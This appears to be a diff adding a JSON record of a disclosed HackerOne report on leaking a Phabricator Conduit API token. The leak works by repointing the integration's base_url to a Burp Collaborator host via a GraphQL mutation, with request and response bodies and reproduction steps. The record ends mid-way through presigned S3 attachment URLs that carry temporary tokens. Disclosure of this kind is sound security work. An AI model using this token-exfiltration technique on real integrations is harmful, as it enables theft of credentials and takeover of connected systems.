@@ -1,0 +1,215 @@
+{
+  "id": 1161141,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMTYxMTQx",
+  "url": "https://hackerone.com/reports/1161141",
+  "title": "Improper data update process on UpdatePhabricatorIntegration mutation leads to leak of Phabricator Conduit API token.",
+  "state": "Closed",
+  "substate": "informative",
+  "severity_rating": "critical",
+  "readable_substate": "Informative",
+  "created_at": "2021-04-12T06:03:10.667Z",
+  "submitted_at": "2021-04-12T06:03:10.811Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "nukedx",
+    "url": "/nukedx",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/CejJr9DapQ8cLv4WyHaDx6LB/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
+    },
+    "is_me?": false,
+    "cleared": true,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 13,
+    "url": "https://hackerone.com/security",
+    "handle": "security",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/013/fa942b9b1cbf4faf37482bf68458e1195aab9c02_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/013/fa942b9b1cbf4faf37482bf68458e1195aab9c02_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "HackerOne",
+      "twitter_handle": "Hacker0x01",
+      "website": "https://hackerone.com",
+      "about": "Vulnerability disclosure should be safe, transparent, and rewarding."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2021-04-30T05:54:40.703Z",
+  "bug_reporter_agreed_on_going_public_at": "2021-04-24T06:58:39.859Z",
+  "team_member_agreed_on_going_public_at": "2021-04-30T05:54:40.497Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Details\n**Title**: Improper data update process on `UpdatePhabricatorIntegration` mutation leads to leak of Phabricator Conduit API token.\n**Risk**: High\n**Impact**: High\n**Exploitability**: High\n**Target**: `base_url` parameter on `UpdatePhabricatorIntegration` mutation at `/graphql` endpoint.\n\n## Introduction\nSensitive data exposure occurs when an application, company, or other entity inadvertently exposes personal data. Sensitive data exposure differs from a data breach, in which an attacker accesses and steals information.\n\n## Synopsis\n**Phabricator Conduit API** is using simple verification system and requires a valid api token for system bots, integrations etc to get full access to the **Phabricator** instances.\n\n**HackerOne** is allowing their program users to add various integrations for their programs, such as **Phabricator**.  When user with enough permissions adds connection details for the **Phabricator** system stores this information and enables settings options.\n\nSettings for **Phabricator** integration are fetched through GraphQL via using `PhabricatorLayoutQuery` operation, when executed users are fetching similar result as below (see F1262314):\n```json\n{\n  \"data\": {\n    \"team\": {\n      \"id\": \"Z2lkOi8vaGFja2Vyb25lL1RlYW0vNTI1NzQ=\",\n      \"phabricator_integration\": {\n        \"id\": \"Z2lkOi8vaGFja2Vyb25lL1BoYWJyaWNhdG9ySW50ZWdyYXRpb24vNDA1\",\n        \"__typename\": \"PhabricatorIntegration\",\n        \"base_url\": \"https://skima.is/\",\n        \"title\": \"{{title}}\",\n        \"description\": \"{{details_markdown}}\",\n        \"process_phabricator_status_change\": true,\n        \"process_phabricator_comment_added\": true,\n        \"process_h1_status_change\": true,\n        \"process_h1_comment_added\": true\n      },\n      \"__typename\": \"Team\",\n      \"handle\": \"test-phab-api-leak\",\n      \"custom_field_attributes\": {\n        \"total_count\": 0,\n        \"edges\": [],\n        \"__typename\": \"CustomFieldAttributeConnection\"\n      }\n    }\n  }\n}\n```\n\nAs we can see from the results, there is no API token information is revealed due to security measures, when we manipulate request and try to fetch API token with `api_token` field which was field used on initial integration add process, GraphQL returns following error (see F1262318):\n```json\n{\n  \"errors\": [\n    {\n      \"message\": \"Field 'api_token' doesn't exist on type 'PhabricatorIntegration'\",\n      \"locations\": [\n        {\n          \"line\": 29,\n          \"column\": 5\n        }\n      ],\n      \"path\": [\n        \"fragment PhabricatorDisconnectForm\",\n        \"phabricator_integration\",\n        \"api_token\"\n      ],\n      \"extensions\": {\n        \"code\": \"undefinedField\",\n        \"typeName\": \"PhabricatorIntegration\",\n        \"fieldName\": \"api_token\"\n      }\n    }\n  ]\n}\n```\n\nOn **Phabricator** integration UI users can only change bi-directional commenting, updates and report escalation settings (see F1262320). When any change is done, `UpdatePhabricatorIntegration` mutation is executed on GraphQL as following (see F1262329):\n```json\n{\n  \"operationName\": \"UpdatePhabricatorIntegration\",\n  \"variables\": {\n    \"team_id\": \"Z2lkOi8vaGFja2Vyb25lL1RlYW0vNTIzNjI=\",\n    \"title\": \"{{title}}\",\n    \"description\": \"{{details_truncated}}\",\n    \"process_h1_comment_added\": true,\n    \"process_h1_status_change\": true,\n    \"process_phabricator_comment_added\": true,\n    \"process_phabricator_status_change\": true\n  },\n  \"query\": \"mutation UpdatePhabricatorIntegration($team_id: ID!, $base_url: String, $api_token: String, $title: String, $description: String, $process_h1_comment_added: Boolean, $process_h1_status_change: Boolean, $process_phabricator_comment_added: Boolean, $process_phabricator_status_change: Boolean) {\\n  updatePhabricatorIntegration(input: {team_id: $team_id, base_url: $base_url, api_token: $api_token, title: $title, description: $description, process_h1_comment_added: $process_h1_comment_added, process_h1_status_change: $process_h1_status_change, process_phabricator_comment_added: $process_phabricator_comment_added, process_phabricator_status_change: $process_phabricator_status_change}) {\\n    was_successful\\n    errors(first: 100) {\\n      edges {\\n        node {\\n          id\\n          type\\n          field\\n          message\\n          __typename\\n        }\\n        __typename\\n      }\\n      __typename\\n    }\\n    team {\\n      id\\n      phabricator_integration {\\n        id\\n        base_url\\n        title\\n        description\\n        process_phabricator_status_change\\n        process_phabricator_comment_added\\n        process_h1_status_change\\n        process_h1_comment_added\\n        __typename\\n      }\\n      __typename\\n    }\\n    __typename\\n  }\\n}\\n\"\n}\n```\nAs we can see this is actually similar to initial integration create process, let's see what happens if we try to change `base_url` field and GraphQL replies as following (see F1262334):\n```json\n{\n  \"data\": {\n    \"updatePhabricatorIntegration\": {\n      \"was_successful\": true,\n      \"errors\": {\n        \"edges\": [],\n        \"__typename\": \"ErrorConnection\"\n      },\n      \"team\": {\n        \"id\": \"Z2lkOi8vaGFja2Vyb25lL1RlYW0vNTIzNjI=\",\n        \"phabricator_integration\": {\n          \"id\": \"Z2lkOi8vaGFja2Vyb25lL1BoYWJyaWNhdG9ySW50ZWdyYXRpb24vNDA4\",\n          \"base_url\": \"https://bixp32pnbkbisrmuxgsrrzn8lzrufj.burpcollaborator.net\",\n          \"title\": \"{{title}}\",\n          \"description\": \"{{details_truncated}}\",\n          \"process_phabricator_status_change\": true,\n          \"process_phabricator_comment_added\": true,\n          \"process_h1_status_change\": true,\n          \"process_h1_comment_added\": true,\n          \"__typename\": \"PhabricatorIntegration\"\n        },\n        \"__typename\": \"Team\"\n      },\n      \"__typename\": \"UpdatePhabricatorIntegrationPayload\"\n    }\n  }\n}\n```\n\nIt looks like we are able to update `base_url` and HackerOne just does DNS query to check if target host is active and not controlling if user trying to update existing connection, it's also possible to change `api_token`too but we do not need it.\n\nNow let's try to see if we are able to leak token in system, all we need to do is finding active report on system, since there is also no active escalation control on `/reports/<reportid>/escalate_to_phabricator` endpoint unlike `/reports/<reportid>/escalate_to_jira` (see F1262353). We can try to escalate to our Burp Collaborator.\n\nFirstly we will view a triage report and escalate it to the valid **Phabricator** (see F1262348), after that we will change `base_url` to our Burp Collaborator (see F1262349).\n\nNow everything is ready to go just send escalate to **Phabricator** request again without deleting old one (see F1262350) and check if our collaborator got hit.\n\nWhen we check our burp collaborator, we will see that api token is leaked (see F1262342), now we can restore base url and restore **Phabricator** settings.\n\n## Root cause of the issue\n**HackerOne** is using `UpdatePhabricatorIntegration` mutation for both creating and updating **Phabricator** integration however, do not verify that existence of connection.\n\nThey are checking if there is active connection and showing settings on UI for according to it, meanwhile not verifying existence of connection is allowing update of the URL for integration.\n\nWhile team member can use any none triaged report to escalating issue to **Phabricator**, they can also abuse improper escalation check on `/reports/<reportid>/escalate_to_phabricator` endpoint and leak the API token.\n\n## Steps to reproduce\n1. Enable Burp Suite or any proxy for tracking and intercepting request done.\n2. Create a new team on https://hackerone.com/teams/new/sandbox or use existing team you are member of.\n3. Go to **Phabricator** integration located on https://hackerone.com/team_handle/phabricator_integration\n4. Set up your **Phabricator** integration\n5. Triage a report and escalate it to **Phabricator** integration.\n6. Update **Phabricator** integration and intercept the request, add following to the GraphQL query: `\"base_url\":\"https://yourcollab\"` and send the request.\n7. Send escalate to the **Phabricator** request again for the report, notice that you will get **500** error or create new report and escalate it.\n8. Check your collaborator server and notice that token is leaked.\n\n## Impact\n\nA malicious team member with enough rights for controlling **Phabricator** integration settings can alternate existing connections URL and leak api token for it by escalating report then revert setting.\n\nSince not all team members might have administrator rights on **Phabricator** instance, they can gain access to the Conduit API which is having all permission on the system which could lead to complete compromising of it.",
+  "weakness": {
+    "id": 18,
+    "name": "Information Disclosure"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 1262314,
+      "file_name": "fetched.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/vksy8nvglpv6w7w0sde7y8f6m4tf?response-content-disposition=attachment%3B%20filename%3D%22fetched.png%22%3B%20filename%2A%3DUTF-8%27%27fetched.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSPM2ZFYU%2F20260509%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260509T151455Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEB4aCXVzLXdlc3QtMiJHMEUCIHG3lvhdV6Q%2FNc2D6sKlTHsRGYZrweI22t6ry9kpUdp%2BAiEAuGNNUGnDsygOalEC0wdPeLjEfO9kjJmzSqRIXat21U4quwUI5%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDB2DhZGUpFzp%2F6DQniqPBQCNUW%2BJNaek3k4RaCLGTVdoLYx0n5tgq5uLPBI3LH%2BNvmjoP%2BtzR%2FKSzkRkgj73nKw7jlai%2BJxC7xzMXjjhEfsTJLCOyNCLXDetgNq3OlvERYLL6cjaJnCKG3dXDyyn5riCq0TLTTmL5BwD%2FR%2BU25AG4rXkS04FqMqD2N%2B2KTcQ4YhLhZ0ZBYU35nsRgjvTPwBSxumomKMLG4mxNw%2BNzkk4rZLehL8e8d8vBukqth9tvZKLNKRKj1eTmi6wstYSo%2B7sxRM9kAY14rdVe2R%2BU63QA8NQZllDKHZQALqw3YrtrGw9NgfbWHfu2ouCB97W6lDYAAmXUQMRz5%2Bbjrt4jTI0pTL5JhgPLheWJXOCAaiGNCS65KlBbt%2FHStTfMnlU5QVKIJo41t%2BdwdrX9QneTYofUrTIcQdfOMmRpubgHz5QGhQlxYlIg%2BYqn1oxPVHj%2FjVcj0ETtwJJ1pWgbGhA%2F7N1yI9v9nsS%2B7P5xf0QN9bwvakkVdUy7zAg6duxSGZBjX0Fhzz%2BLO%2BZlnmHMTyelWpQyC8NV6t3thY3otZ9lfKd4je1ct%2BElWJczJchoIU32uYh4LahB%2BRX1c7WBpf%2F1s3ZlTnS6krpSp8txBBw5PbPH0t3bXjoKOwQ2lcGNdtfcqKqJdryXl7mmbL6FZjDeT01AIqyi82BQREkRIFrekqMTFHp3FVe86zjzoImC8w8PcuWYdmS1tKrhedEXS3RUQkwjEUtL88wSyjppMCrH5itHf6QvXWQQYfYdhHw5VkBevQTJ0SBwymCTFZDqWoF0L9dR4VlSQPC7Vg0rPWK%2FgMmdjFb3qVxnTtP4V%2FZC%2Bmq1ao6t8ovvACstrb%2FipjWvBk9uu7eIoWt0CDxOrWyFLkw44D9zwY6sQHfD7GsNGzCwc%2F9EebOqukVTHLOQECqcB%2BY2rnbgL4%2Fa0QxE1PEo7pbHRvePgIoUYit7jfxwtEAypJGJ8UaQirZuH15LYN%2FKJtCqU0jTUV5NTorZYHLY7%2F0gt9Gn4zttOSm355Wl2vm32qbu958noCBAeZo6982NsfKFhZxKyedSl5jCPoFvcsZ4q4Zzg0Foy%2FXr0X01vbwebHBns95S7mKebnLLlUmdQzJUxF%2FIMDaj3I%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=d51b2053f664fbf4128601f8f5c394f5f16cdb9fab6e4829d8ffebd38a131c80",
+      "file_size": 143367,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 1262318,
+      "file_name": "error.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/m47k15c2muys64775ihk97lkkjoh?response-content-disposition=attachment%3B%20filename%3D%22error.png%22%3B%20filename%2A%3DUTF-8%27%27error.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSPM2ZFYU%2F20260509%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260509T151455Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEB4aCXVzLXdlc3QtMiJHMEUCIHG3lvhdV6Q%2FNc2D6sKlTHsRGYZrweI22t6ry9kpUdp%2BAiEAuGNNUGnDsygOalEC0wdPeLjEfO9kjJmzSqRIXat21U4quwUI5%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDB2DhZGUpFzp%2F6DQniqPBQCNUW%2BJNaek3k4RaCLGTVdoLYx0n5tgq5uLPBI3LH%2BNvmjoP%2BtzR%2FKSzkRkgj73nKw7jlai%2BJxC7xzMXjjhEfsTJLCOyNCLXDetgNq3OlvERYLL6cjaJnCKG3dXDyyn5riCq0TLTTmL5BwD%2FR%2BU25AG4rXkS04FqMqD2N%2B2KTcQ4YhLhZ0ZBYU35nsRgjvTPwBSxumomKMLG4mxNw%2BNzkk4rZLehL8e8d8vBukqth9tvZKLNKRKj1eTmi6wstYSo%2B7sxRM9kAY14rdVe2R%2BU63QA8NQZllDKHZQALqw3YrtrGw9NgfbWHfu2ouCB97W6lDYAAmXUQMRz5%2Bbjrt4jTI0pTL5JhgPLheWJXOCAaiGNCS65KlBbt%2FHStTfMnlU5QVKIJo41t%2BdwdrX9QneTYofUrTIcQdfOMmRpubgHz5QGhQlxYlIg%2BYqn1oxPVHj%2FjVcj0ETtwJJ1pWgbGhA%2F7N1yI9v9nsS%2B7P5xf0QN9bwvakkVdUy7zAg6duxSGZBjX0Fhzz%2BLO%2BZlnmHMTyelWpQyC8NV6t3thY3otZ9lfKd4je1ct%2BElWJczJchoIU32uYh4LahB%2BRX1c7WBpf%2F1s3ZlTnS6krpSp8txBBw5PbPH0t3bXjoKOwQ2lcGNdtfcqKqJdryXl7mmbL6FZjDeT01AIqyi82BQREkRIFrekqMTFHp3FVe86zjzoImC8w8PcuWYdmS1tKrhedEXS3RUQkwjEUtL88wSyjppMCrH5itHf6QvXWQQYfYdhHw5VkBevQTJ0SBwymCTFZDqWoF0L9dR4VlSQPC7Vg0rPWK%2FgMmdjFb3qVxnTtP4V%2FZC%2Bmq1ao6t8ovvACstrb%2FipjWvBk9uu7eIoWt0CDxOrWyFLkw44D9zwY6sQHfD7GsNGzCwc%2F9EebOqukVTHLOQECqcB%2BY2rnbgL4%2Fa0QxE1PEo7pbHRvePgIoUYit7jfxwtEAypJGJ8UaQirZuH15LYN%2FKJtCqU0jTUV5NTorZYHLY7%2F0gt9Gn4zttOSm355Wl2vm32qbu958noCBAeZo6982NsfKFhZxKyedSl5jCPoFvcsZ4q4Zzg0Foy%2FXr0X01vbwebHBns95S7mKebnLLlUmdQzJUxF%2FIMDaj3I%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=fb386cb21974e7257c45a60030c167764fcb893951f599bb3b4bb2e2e1b95ed7",
+      "file_size": 127743,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 1262320,
+      "file_name": "phab-settings.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/h8e1nvodm03zokjg9myjpagxbd0e?response-content-disposition=attachment%3B%20filename%3D%22phab-settings.png%22%3B%20filename%2A%3DUTF-8%27%27phab-settings.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSPM2ZFYU%2F20260509%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260509T151455Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEB4aCXVzLXdlc3QtMiJHMEUCIHG3lvhdV6Q%2FNc2D6sKlTHsRGYZrweI22t6ry9kpUdp%2BAiEAuGNNUGnDsygOalEC0wdPeLjEfO9kjJmzSqRIXat21U4quwUI5%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDB2DhZGUpFzp%2F6DQniqPBQCNUW%2BJNaek3k4RaCLGTVdoLYx0n5tgq5uLPBI3LH%2BNvmjoP%2BtzR%2FKSzkRkgj73nKw7jlai%2BJxC7xzMXjjhEfsTJLCOyNCLXDetgNq3OlvERYLL6cjaJnCKG3dXDyyn5riCq0TLTTmL5BwD%2FR%2BU25AG4rXkS04FqMqD2N%2B2KTcQ4YhLhZ0ZBYU35nsRgjvTPwBSxumomKMLG4mxNw%2BNzkk4rZLehL8e8d8vBukqth9tvZKLNKRKj1eTmi6wstYSo%2B7sxRM9kAY14rdVe2R%2BU63QA8NQZllDKHZQALqw3YrtrGw9NgfbWHfu2ouCB97W6lDYAAmXUQMRz5%2Bbjrt4jTI0pTL5JhgPLheWJXOCAaiGNCS65KlBbt%2FHStTfMnlU5QVKIJo41t%2BdwdrX9QneTYofUrTIcQdfOMmRpubgHz5QGhQlxYlIg%2BYqn1oxPVHj%2FjVcj0ETtwJJ1pWgbGhA%2F7N1yI9v9nsS%2B7P5xf0QN9bwvakkVdUy7zAg6duxSGZBjX0Fhzz%2BLO%2BZlnmHMTyelWpQyC8NV6t3thY3otZ9lfKd4je1ct%2BElWJczJchoIU32uYh4LahB%2BRX1c7WBpf%2F1s3ZlTnS6krpSp8txBBw5PbPH0t3bXjoKOwQ2lcGNdtfcqKqJdryXl7mmbL6FZjDeT01AIqyi82BQREkRIFrekqMTFHp3FVe86zjzoImC8w8PcuWYdmS1tKrhedEXS3RUQkwjEUtL88wSyjppMCrH5itHf6QvXWQQYfYdhHw5VkBevQTJ0SBwymCTFZDqWoF0L9dR4VlSQPC7Vg0rPWK%2FgMmdjFb3qVxnTtP4V%2FZC%2Bmq1ao6t8ovvACstrb%2FipjWvBk9uu7eIoWt0CDxOrWyFLkw44D9zwY6sQHfD7GsNGzCwc%2F9EebOqukVTHLOQECqcB%2BY2rnbgL4%2Fa0QxE1PEo7pbHRvePgIoUYit7jfxwtEAypJGJ8UaQirZuH15LYN%2FKJtCqU0jTUV5NTorZYHLY7%2F0gt9Gn4zttOSm355Wl2vm32qbu958noCBAeZo6982NsfKFhZxKyedSl5jCPoFvcsZ4q4Zzg0Foy%2FXr0X01vbwebHBns95S7mKebnLLlUmdQzJUxF%2FIMDaj3I%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=28161f4ccb3dd8086a17199acc2934c02828db5ccaec636ab7fc7d5aeef893ba",
+      "file_size": 34210,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 1262329,
+      "file_name": "update.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/n6rv8bk04q9jwh14jxlihcpbaddo?response-content-disposition=attachment%3B%20filename%3D%22update.png%22%3B%20filename%2A%3DUTF-8%27%27update.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSPM2ZFYU%2F20260509%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260509T151455Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEB4aCXVzLXdlc3QtMiJHMEUCIHG3lvhdV6Q%2FNc2D6sKlTHsRGYZrweI22t6ry9kpUdp%2BAiEAuGNNUGnDsygOalEC0wdPeLjEfO9kjJmzSqRIXat21U4quwUI5%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDB2DhZGUpFzp%2F6DQniqPBQCNUW%2BJNaek3k4RaCLGTVdoLYx0n5tgq5uLPBI3LH%2BNvmjoP%2BtzR%2FKSzkRkgj73nKw7jlai%2BJxC7xzMXjjhEfsTJLCOyNCLXDetgNq3OlvERYLL6cjaJnCKG3dXDyyn5riCq0TLTTmL5BwD%2FR%2BU25AG4rXkS04FqMqD2N%2B2KTcQ4YhLhZ0ZBYU35nsRgjvTPwBSxumomKMLG4mxNw%2BNzkk4rZLehL8e8d8vBukqth9tvZKLNKRKj1eTmi6wstYSo%2B7sxRM9kAY14rdVe2R%2BU63QA8NQZllDKHZQALqw3YrtrGw9NgfbWHfu2ouCB97W6lDYAAmXUQMRz5%2Bbjrt4jTI0pTL5JhgPLheWJXOCAaiGNCS65KlBbt%2FHStTfMnlU5QVKIJo41t%2BdwdrX9QneTYofUrTIcQdfOMmRpubgHz5QGhQlxYlIg%2BYqn1oxPVHj%2FjVcj0ETtwJJ1pWgbGhA%2F7N1yI9v9nsS%2B7P5xf0QN9bwvakkVdUy7zAg6duxSGZBjX0Fhzz%2BLO%2BZlnmHMTyelWpQyC8NV6t3thY3otZ9lfKd4je1ct%2BElWJczJchoIU32uYh4LahB%2BRX1c7WBpf%2F1s3ZlTnS6krpSp8txBBw5PbPH0t3bXjoKOwQ2lcGNdtfcqKqJdryXl7mmbL6FZjDeT01AIqyi82BQREkRIFrekqMTFHp3FVe86zjzoImC8w8PcuWYdmS1tKrhedEXS3RUQkwjEUtL88wSyjppMCrH5itHf6QvXWQQYfYdhHw5VkBevQTJ0SBwymCTFZDqWoF0L9dR4VlSQPC7Vg0rPWK%2FgMmdjFb3qVxnTtP4V%2FZC%2Bmq1ao6t8ovvACstrb%2FipjWvBk9uu7eIoWt0CDxOrWyFLkw44D9zwY6sQHfD7GsNGzCwc%2F9EebOqukVTHLOQECqcB%2BY2rnbgL4%2Fa0QxE1PEo7pbHRvePgIoUYit7jfxwtEAypJGJ8UaQirZuH15LYN%2FKJtCqU0jTUV5NTorZYHLY7%2F0gt9Gn4zttOSm355Wl2vm32qbu958noCBAeZo6982NsfKFhZxKyedSl5jCPoFvcsZ4q4Zzg0Foy%2FXr0X01vbwebHBns95S7mKebnLLlUmdQzJUxF%2FIMDaj3I%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=cea42a5f527067024f57e5174367dd710b94b6320f5e03f20839c3d290b19d09",
+      "file_size": 153210,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 1262334,
+      "file_name": "changed.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/zq924hsyfqtd4kt5zw9jnfwhquit?response-content-disposition=attachment%3B%20filename%3D%22changed.png%22%3B%20filename%2A%3DUTF-8%27%27changed.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSPM2ZFYU%2F20260509%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260509T151455Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEB4aCXVzLXdlc3QtMiJHMEUCIHG3lvhdV6Q%2FNc2D6sKlTHsRGYZrweI22t6ry9kpUdp%2BAiEAuGNNUGnDsygOalEC0wdPeLjEfO9kjJmzSqRIXat21U4quwUI5%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDB2DhZGUpFzp%2F6DQniqPBQCNUW%2BJNaek3k4RaCLGTVdoLYx0n5tgq5uLPBI3LH%2BNvmjoP%2BtzR%2FKSzkRkgj73nKw7jlai%2BJxC7xzMXjjhEfsTJLCOyNCLXDetgNq3OlvERYLL6cjaJnCKG3dXDyyn5riCq0TLTTmL5BwD%2FR%2BU25AG4rXkS04FqMqD2N%2B2KTcQ4YhLhZ0ZBYU35nsRgjvTPwBSxumomKMLG4mxNw%2BNzkk4rZLehL8e8d8vBukqth9tvZKLNKRKj1eTmi6wstYSo%2B7sxRM9kAY14rdVe2R%2BU63QA8NQZllDKHZQALqw3YrtrGw9NgfbWHfu2ouCB97W6lDYAAmXUQMRz5%2Bbjrt4jTI0pTL5JhgPLheWJXOCAaiGNCS65KlBbt%2FHStTfMnlU5QVKIJo41t%2BdwdrX9QneTYofUrTIcQdfOMmRpubgHz5QGhQlxYlIg%2BYqn1oxPVHj%2FjVcj0ETtwJJ1pWgbGhA%2F7N1yI9v9nsS%2B7P5xf0QN9bwvakkVdUy7zAg6duxSGZBjX0Fhzz%2BLO%2BZlnmHMTyelWpQyC8NV6t3thY3otZ9lfKd4je1ct%2BElWJczJchoIU32uYh4LahB%2BRX1c7WBpf%2F1s3ZlTnS6krpSp8txBBw5PbPH0t3bXjoKOwQ2lcGNdtfcqKqJdryXl7mmbL6FZjDeT01AIqyi82BQREkRIFrekqMTFHp3FVe86zjzoImC8w8PcuWYdmS1tKrhedEXS3RUQkwjEUtL88wSyjppMCrH5itHf6QvXWQQYfYdhHw5VkBevQTJ0SBwymCTFZDqWoF0L9dR4VlSQPC7Vg0rPWK%2FgMmdjFb3qVxnTtP4V%2FZC%2Bmq1ao6t8ovvACstrb%2FipjWvBk9uu7eIoWt0CDxOrWyFLkw44D9zwY6sQHfD7GsNGzCwc%2F9EebOqukVTHLOQECqcB%2BY2rnbgL4%2Fa0QxE1PEo7pbHRvePgIoUYit7jfxwtEAypJGJ8UaQirZuH15LYN%2FKJtCqU0jTUV5NTorZYHLY7%2F0gt9Gn4zttOSm355Wl2vm32qbu958noCBAeZo6982NsfKFhZxKyedSl5jCPoFvcsZ4q4Zzg0Foy%2FXr0X01vbwebHBns95S7mKebnLLlUmdQzJUxF%2FIMDaj3I%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=2fa23c30f43b12a85c311f0171e83c55314b0b8574e0698da2d7ce2cc83a3779",
+      "file_size": 161377,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 1262342,
+      "file_name": "token-leaked.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/2lpdhishxs0ghbebz69dzemusncp?response-content-disposition=attachment%3B%20filename%3D%22token-leaked.png%22%3B%20filename%2A%3DUTF-8%27%27token-leaked.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSPM2ZFYU%2F20260509%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260509T151455Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEB4aCXVzLXdlc3QtMiJHMEUCIHG3lvhdV6Q%2FNc2D6sKlTHsRGYZrweI22t6ry9kpUdp%2BAiEAuGNNUGnDsygOalEC0wdPeLjEfO9kjJmzSqRIXat21U4quwUI5%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDB2DhZGUpFzp%2F6DQniqPBQCNUW%2BJNaek3k4RaCLGTVdoLYx0n5tgq5uLPBI3LH%2BNvmjoP%2BtzR%2FKSzkRkgj73nKw7jlai%2BJxC7xzMXjjhEfsTJLCOyNCLXDetgNq3OlvERYLL6cjaJnCKG3dXDyyn5riCq0TLTTmL5BwD%2FR%2BU25AG4rXkS04FqMqD2N%2B2KTcQ4YhLhZ0ZBYU35nsRgjvTPwBSxumomKMLG4mxNw%2BNzkk4rZLehL8e8d8vBukqth9tvZKLNKRKj1eTmi6wstYSo%2B7sxRM9kAY14rdVe2R%2BU63QA8NQZllDKHZQALqw3YrtrGw9NgfbWHfu2ouCB97W6lDYAAmXUQMRz5%2Bbjrt4jTI0pTL5JhgPLheWJXOCAaiGNCS65KlBbt%2FHStTfMnlU5QVKIJo41t%2BdwdrX9QneTYofUrTIcQdfOMmRpubgHz5QGhQlxYlIg%2BYqn1oxPVHj%2FjVcj0ETtwJJ1pWgbGhA%2F7N1yI9v9nsS%2B7P5xf0QN9bwvakkVdUy7zAg6duxSGZBjX0Fhzz%2BLO%2BZlnmHMTyelWpQyC8NV6t3thY3otZ9lfKd4je1ct%2BElWJczJchoIU32uYh4LahB%2BRX1c7WBpf%2F1s3ZlTnS6krpSp8txBBw5PbPH0t3bXjoKOwQ2lcGNdtfcqKqJdryXl7mmbL6FZjDeT01AIqyi82BQREkRIFrekqMTFHp3FVe86zjzoImC8w8PcuWYdmS1tKrhedEXS3RUQkwjEUtL88wSyjppMCrH5itHf6QvXWQQYfYdhH